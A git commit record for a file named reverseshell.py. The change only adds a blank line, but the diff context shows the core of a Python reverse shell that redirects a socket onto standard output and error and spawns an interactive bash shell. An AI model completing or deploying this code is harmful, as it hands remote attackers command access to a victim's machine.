f1ef6c4c52daf2f76cb981525aafe617bbe3f69f
Keyjeek <88333825+Keyj33k@users.noreply.github.com>
2022-04-06 07:48:50 +0200

    Update reverseshell.py

--- reverseshell.py
+++ reverseshell.py
@@ -47,3 +47,4 @@ if __name__ == "__main__":
     dup2(socket_sock.fileno(),1) # used for request I/O actions from the OS
     dup2(socket_sock.fileno(),2)
     run(["/bin/bash"], shell=True) # run the bash console interactive shell
+
